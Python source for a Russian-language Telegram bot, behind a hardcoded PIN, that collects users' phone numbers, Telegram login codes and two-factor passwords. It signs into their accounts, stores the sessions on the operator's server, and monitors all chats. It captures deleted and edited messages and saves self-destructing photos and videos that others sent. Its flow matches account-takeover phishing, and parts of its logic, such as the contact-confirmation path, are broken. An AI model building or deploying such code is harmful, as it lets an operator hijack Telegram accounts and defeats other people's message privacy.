import os
import asyncio
import logging
import random
from datetime import datetime
from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PhoneCodeExpiredError,
    FloodWaitError
)
from telethon.tl.custom import Button
from telethon.sessions import StringSession
import nest_asyncio

nest_asyncio.apply()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')

bot = TelegramClient('bot', API_ID, API_HASH)

# ========== НАБОР СТИКЕРОВ УТКИ ==========
DUCK_STICKERS = {
    'happy': ['🦆✨', '🦆⭐', '🦆🎉', '🦆✅', '🦆👍', '🦆🌈', '🦆💫', '🦆🌟', '🦆🎊', '🦆🎈'],
    'sad': ['🦆😢', '🦆💔', '🦆❌', '🦆😞', '🦆😔', '🦆😟', '🦆😕', '🦆🥺', '🦆😭', '🦆😿'],
    'waiting': ['🦆🤔', '🦆⌛', '🦆⏳', '🦆🔄', '🦆👀', '🦆💭', '🦆❓', '🦆🤷', '🦆🤨', '🦆🧐'],
    'working': ['🦆⚙️', '🦆🔧', '🦆💻', '🦆📱', '🦆📨', '🦆📩', '🦆📤', '🦆📥', '🦆🛠️', '🦆🔍'],
    'numbers': ['🦆0️⃣', '🦆1️⃣', '🦆2️⃣', '🦆3️⃣', '🦆4️⃣', '🦆5️⃣', '🦆6️⃣', '🦆7️⃣', '🦆8️⃣', '🦆9️⃣']
}

def get_duck_sticker(mood='happy', number=None):
    if mood == 'numbers' and number is not None:
        return DUCK_STICKERS['numbers'][number % 10]
    return random.choice(DUCK_STICKERS.get(mood, DUCK_STICKERS['happy']))

# ========== ХРАНИЛИЩЕ ==========
user_sessions = {}  # {user_id: {'phone': '...', 'client': ..., 'step': '...', 'code_hash': '...'}}
authorized_users = set()
ACCESS_PIN = "5482"
message_cache = {}
user_contacts = {}
user_clients = {}  # Сохраняем авторизованных клиентов

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
async def safe_edit(message, new_text, buttons=None):
    """Безопасно редактирует сообщение"""
    try:
        if message.text != new_text:
            await message.edit(new_text, buttons=buttons)
    except:
        pass

async def show_duck_animation(event, text, mood='waiting', duration=2):
    """Показывает анимацию с уткой"""
    msg = await event.reply(f"{get_duck_sticker(mood)} {text}")
    for i in range(duration):
        await asyncio.sleep(1)
        await msg.edit(f"{get_duck_sticker('working')} {text}")
    return msg

# ========== ОСНОВНОЙ ОБРАБОТЧИК ==========
@bot.on(events.NewMessage)
async def handler(event):
    user_id = event.sender_id
    text = event.message.text.strip()

    # === ПИН-КОД ===
    if user_id not in authorized_users:
        if text == ACCESS_PIN:
            authorized_users.add(user_id)
            await event.reply(
                f"{get_duck_sticker('happy')} **Пин-код верный!**\n\n"
                f"👇 Выбери действие:",
                buttons=[
                    [Button.text("📱 Отправить мой номер", resize=True)],
                    [Button.text("📞 Ввести номер вручную")],
                    [Button.text("🔄 Уже есть код")]
                ]
            )
        else:
            await event.reply(f"{get_duck_sticker('sad')} **Неверный пин-код!**\nВведи: `5482`")
        return

    # === ГЛАВНОЕ МЕНЮ ===
    if text == "/start":
        await event.reply(
            f"{get_duck_sticker('happy')} **Добро пожаловать!**\n\n"
            f"Выбери способ входа:",
            buttons=[
                [Button.text("📱 Отправить мой номер", resize=True)],
                [Button.text("📞 Ввести номер вручную")],
                [Button.text("🔄 Уже есть код")],
                [Button.text("❓ Помощь")]
            ]
        )
        return

    # === ПОМОЩЬ ===
    if text == "❓ Помощь":
        await event.reply(
            f"{get_duck_sticker('waiting')} **Как войти:**\n\n"
            f"1️⃣ **Пин-код:** 5482\n"
            f"2️⃣ **Отправить номер:** нажми кнопку и подтверди\n"
            f"3️⃣ **Ввести номер:** введи вручную +79001234567\n"
            f"4️⃣ **Код:** придёт в Telegram\n"
            f"5️⃣ **2FA:** если есть пароль — введи его\n\n"
            f"{get_duck_sticker('happy')} После входа начнётся мониторинг!"
        )
        return

    # === ОТПРАВКА НОМЕРА (КНОПКА) ===
    if text == "📱 Отправить мой номер":
        await event.reply(
            f"{get_duck_sticker('waiting')} **Нажми кнопку ниже,**\n"
            f"чтобы отправить свой номер телефона:",
            buttons=[[Button.request_contact("📞 Поделиться контактом")]]
        )
        return

    # === ВВОД НОМЕРА ВРУЧНУЮ ===
    if text == "📞 Ввести номер вручную":
        user_sessions[user_id] = {'step': 'waiting_phone'}
        await event.reply(
            f"{get_duck_sticker('waiting')} **Введи номер в формате:**\n"
            f"`+79001234567`"
        )
        return

    # === УЖЕ ЕСТЬ КОД ===
    if text == "🔄 Уже есть код":
        if user_id in user_sessions and user_sessions[user_id].get('phone'):
            user_sessions[user_id]['step'] = 'waiting_code'
            await event.reply(f"{get_duck_sticker('waiting')} **Введи код из Telegram:**")
        else:
            await event.reply(f"{get_duck_sticker('sad')} **Сначала введи номер!**")
        return

    # === ПОЛУЧЕНИЕ НОМЕРА ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_phone':
        phone = text
        user_sessions[user_id]['phone'] = phone
        user_sessions[user_id]['step'] = 'waiting_code'
        
        anim = await show_duck_animation(event, "Отправляю код...", 'working', 2)
        
        try:
            client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
            await client.connect()
            
            sent_code = await client.send_code_request(phone)
            
            user_sessions[user_id]['client'] = client
            user_sessions[user_id]['code_hash'] = sent_code.phone_code_hash
            
            await anim.edit(
                f"{get_duck_sticker('happy')} **Код отправлен!**\n\n"
                f"📨 Проверь Telegram\n"
                f"⏳ Код действителен 2 минуты\n"
                f"👇 **Введи код:**",
                buttons=[
                    [Button.text("🔄 Уже есть код")],
                    [Button.text("❌ Отмена")]
                ]
            )
            
        except Exception as e:
            await anim.edit(f"{get_duck_sticker('sad')} **Ошибка:** {e}")
            if user_id in user_sessions:
                del user_sessions[user_id]
        return

    # === ПОЛУЧЕНИЕ КОДА ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_code':
        code = text.strip()
        session = user_sessions[user_id]
        client = session['client']
        
        anim = await show_duck_animation(event, "Проверяю код...", 'working', 2)
        
        try:
            await client.sign_in(session['phone'], code, phone_code_hash=session['code_hash'])
            
            # Успешный вход
            me = await client.get_me()
            user_clients[user_id] = client
            
            await anim.edit(
                f"{get_duck_sticker('happy')} **Успешный вход!**\n\n"
                f"👤 Аккаунт: @{me.username}\n"
                f"🆔 ID: {me.id}\n\n"
                f"🔍 **Мониторинг запущен!**",
                buttons=[
                    [Button.text("📊 Статистика")],
                    [Button.text("🚪 Выйти")]
                ]
            )
            
            if user_id in user_sessions:
                del user_sessions[user_id]
            
            asyncio.create_task(monitor_user_chats(user_id, client))
            
        except SessionPasswordNeededError:
            # Требуется 2FA
            user_sessions[user_id]['step'] = 'waiting_2fa'
            await anim.edit(
                f"{get_duck_sticker('waiting')} **Требуется двухфакторный пароль.**\n\n"
                f"Введи свой пароль Telegram:",
                buttons=[[Button.text("❌ Отмена")]]
            )
            
        except PhoneCodeInvalidError:
            await anim.edit(
                f"{get_duck_sticker('sad')} **Неверный код!**\n\n"
                f"Попробуй ещё раз:",
                buttons=[[Button.text("🔄 Уже есть код")]]
            )
            
        except PhoneCodeExpiredError:
            await anim.edit(
                f"{get_duck_sticker('sad')} **Код истёк.**\n\n"
                f"Нажми /start и начни заново."
            )
            if user_id in user_sessions:
                del user_sessions[user_id]
            
        except Exception as e:
            await anim.edit(f"{get_duck_sticker('sad')} **Ошибка:** {e}")
            if user_id in user_sessions:
                del user_sessions[user_id]
        return

    # === ПОЛУЧЕНИЕ 2FA ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_2fa':
        password = text
        session = user_sessions[user_id]
        client = session['client']
        
        anim = await show_duck_animation(event, "Проверяю пароль...", 'working', 2)
        
        try:
            await client.sign_in(password=password)
            
            me = await client.get_me()
            user_clients[user_id] = client
            
            await anim.edit(
                f"{get_duck_sticker('happy')} **Вход с 2FA выполнен!**\n\n"
                f"👤 Аккаунт: @{me.username}\n"
                f"🆔 ID: {me.id}\n\n"
                f"🔍 **Мониторинг запущен!**",
                buttons=[
                    [Button.text("📊 Статистика")],
                    [Button.text("🚪 Выйти")]
                ]
            )
            
            if user_id in user_sessions:
                del user_sessions[user_id]
            
            asyncio.create_task(monitor_user_chats(user_id, client))
            
        except Exception as e:
            await anim.edit(f"{get_duck_sticker('sad')} **Ошибка:** {e}")
        return

    # === СТАТИСТИКА ===
    if text == "📊 Статистика":
        if user_id in user_clients:
            await event.reply(
                f"{get_duck_sticker('happy')} **Статистика**\n\n"
                f"📦 Кэш сообщений: {len(message_cache)}\n"
                f"👤 Аккаунт: активен\n"
                f"🔍 Мониторинг: работает"
            )
        else:
            await event.reply(f"{get_duck_sticker('sad')} **Нет активного аккаунта**")
        return

    # === ВЫХОД ===
    if text == "🚪 Выйти":
        if user_id in user_clients:
            await user_clients[user_id].disconnect()
            del user_clients[user_id]
        await event.reply(
            f"{get_duck_sticker('sad')} **Выход выполнен**\n\n"
            f"Используй /start чтобы начать заново"
        )
        return

# === ОБРАБОТКА ПОЛУЧЕННОГО КОНТАКТА ===
@bot.on(events.NewMessage(func=lambda e: e.message.contact))
async def contact_handler(event):
    user_id = event.sender_id
    contact = event.message.contact
    
    # Проверяем, что номер принадлежит этому пользователю
    if str(user_id) != str(contact.user_id):
        await event.reply(f"{get_duck_sticker('sad')} **Это не твой номер!**")
        return
    
    # Сохраняем контакт
    user_contacts[user_id] = {
        'phone': contact.phone_number,
        'first_name': contact.first_name,
        'last_name': contact.last_name
    }
    
    # Запрашиваем подтверждение
    await event.reply(
        f"{get_duck_sticker('waiting')} **Контакт получен!**\n\n"
        f"Имя: {contact.first_name}\n"
        f"Номер: `{contact.phone_number}`\n\n"
        f"**Использовать этот номер для входа?**",
        buttons=[
            [Button.text("✅ Да, войти")],
            [Button.text("❌ Нет, отмена")]
        ]
    )

# === ПОДТВЕРЖДЕНИЕ КОНТАКТА ===
@bot.on(events.NewMessage)
async def confirm_contact_handler(event):
    user_id = event.sender_id
    text = event.message.text
    
    if text == "✅ Да, войти" and user_id in user_contacts:
        contact = user_contacts[user_id]
        
        # Начинаем процесс входа
        user_sessions[user_id] = {
            'step': 'waiting_phone',
            'phone': contact['phone']
        }
        
        # Отправляем код
        await handler(event)
        
    elif text == "❌ Нет, отмена" and user_id in user_contacts:
        del user_contacts[user_id]
        await event.reply(f"{get_duck_sticker('sad')} **Отменено**")

# === МОНИТОРИНГ ===
async def monitor_user_chats(user_id, client):
    """Мониторит удалённые, изменённые и истекающие сообщения"""
    
    await bot.send_message(user_id, f"{get_duck_sticker('happy')} **Мониторинг запущен!**")
    
    @client.on(events.NewMessage)
    async def on_new(event):
        cache_key = f"{event.chat_id}_{event.message.id}"
        
        msg_type = "text"
        if event.message.photo:
            msg_type = "photo"
        elif event.message.video:
            msg_type = "video"
        
        # Проверяем, истекающее ли сообщение
        if hasattr(event.message, 'ttl_seconds') and event.message.ttl_seconds:
            ttl = event.message.ttl_seconds
            
            await bot.send_message(
                user_id,
                f"{get_duck_sticker('waiting')} **ИСТЕКАЮЩЕЕ СООБЩЕНИЕ**\n\n"
                f"Чат: {event.chat_id}\n"
                f"Тип: {msg_type}\n"
                f"Истечёт через: {ttl} сек"
            )
            
            # Сохраняем медиа
            if event.message.photo or event.message.video:
                try:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"expiring_{timestamp}.dat"
                    path = await event.message.download_media(file=filename)
                    
                    await bot.send_file(
                        user_id,
                        path,
                        caption=f"{get_duck_sticker('happy')} Сохранённое истекающее {msg_type}"
                    )
                    os.remove(path)
                except:
                    pass
        
        # Кэшируем
        message_cache[cache_key] = {
            'text': event.message.text or f"[{msg_type}]",
            'time': datetime.now().isoformat(),
            'chat_id': event.chat_id
        }
        
        if len(message_cache) > 1000:
            keys = list(message_cache.keys())[:200]
            for k in keys:
                del message_cache[k]

    @client.on(events.MessageDeleted)
    async def on_delete(event):
        for msg_id in event.deleted_ids:
            cache_key = f"{event.chat_id}_{msg_id}"
            if cache_key in message_cache:
                msg = message_cache[cache_key]
                await bot.send_message(
                    user_id,
                    f"{get_duck_sticker('sad')} **УДАЛЕНО**\n\n"
                    f"Текст: {msg['text'][:200]}"
                )
                del message_cache[cache_key]

    @client.on(events.MessageEdited)
    async def on_edit(event):
        cache_key = f"{event.chat_id}_{event.message.id}"
        if cache_key in message_cache:
            old = message_cache[cache_key]['text']
            new = event.message.text
            if old != new:
                await bot.send_message(
                    user_id,
                    f"{get_duck_sticker('waiting')} **ИЗМЕНЕНО**\n\n"
                    f"Было: {old[:200]}\n"
                    f"Стало: {new[:200]}"
                )
                message_cache[cache_key]['text'] = new

    await client.run_until_disconnected()

# === ЗАПУСК ===
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"✅ Бот @{me.username} запущен! Пин-код: 5482")
    logger.info("🦆 Стикеры утки активны")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())